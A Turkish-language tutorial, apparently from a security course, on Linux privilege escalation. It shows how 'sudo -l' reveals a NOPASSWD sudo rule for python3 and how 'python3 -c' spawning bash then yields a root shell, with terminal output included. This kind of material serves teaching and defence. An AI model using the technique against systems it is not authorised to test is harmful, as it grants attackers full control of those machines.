Sudo ayrıcalıkları bir kullanıcıya verilebilir ve sudo ayrıcalıkları verilen kullanıcı root kullanıcısının haklarıyla komutları çalıştırabilir. sudo ile bir komut çalıştırıldığında, sistem komutu veren kullanıcının /etc/sudoers içinde yapılandırıldığı gibi uygun haklara sahip olup olmadığını kontrol edecektir. Bir sisteme girdiğimizde, sudo -l yazarak mevcut kullanıcının herhangi bir sudo ayrıcalığına sahip olup olmadığını kontrol etmeliyiz. Bazen sudo haklarını listelemek için kullanıcının parolasını bilmemiz gerekir, ancak NOPASSWD seçeneğine sahip bir ayrıcalık varsa parola girmeden görülebilir.

```auto
user@hackerbox:~$ sudo -l
Matching Defaults entries for user on hackerbox:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User user may run the following commands on hackerbox:
    (ALL : ALL) NOPASSWD: /usr/bin/python3
```

sudo ayrıcalıklarını yanlış yapılandırmak olası bir hatadır. Örneğin, bir kullanıcıya parola gerektirmeden root haklarıyla komut çalıştırabilme yetkisi verilebilir. Yukarıdaki hatalı yapılandırılmış sudoers dosyasına göre "user" kullanıcısına "python3" komutunu root yetkileriyle ve parolasız çalıştırabilme hakkı verilmiştir. Bu durumda bir saldırgan python3 komutunun **-c cmd** parametresini kullanarak yetki yükseltmeyi deneyebilir.

```auto
user@hackerbox:~$ python3 -h
usage: python3 [option] ... [-c cmd | -m mod | file | -] [arg] ...
Options (and corresponding environment variables):
<...SNIP...>
-c cmd : program passed in as string (terminates option list)
-d     : turn on parser debugging output (for experts only, only works on
        debug builds); also PYTHONDEBUG=x
-E     : ignore PYTHON* environment variables (such as PYTHONPATH)
-h     : print this help message and exit (also -? or --help)
-i     : inspect interactively after running script; forces a prompt even
        if stdin does not appear to be a terminal; also PYTHONINSPECT=x
-I     : isolate Python from the user's environment (implies -E and -s)
-m mod : run library module as a script (terminates option list)
<SNIP>
```

Root yetkileriyle çalıştırabildiğimiz python programını ve kütüphanelerini yetki yükseltmek için kullanabiliriz.

Python3 komutunu -c parametresiyle birlikte çalıştırarak root yetkileriyle çalışan yeni bir bash kabuğu açmayı deneyelim.

```auto
user@hackerbox:~$ python3 -c 'import os; os.system("/bin/bash")'
root💀hackerbox:~# whoami
root
```

Python3 komutunu gerekli parametrelerle çalıştırarak root kabuğu elde ettik.
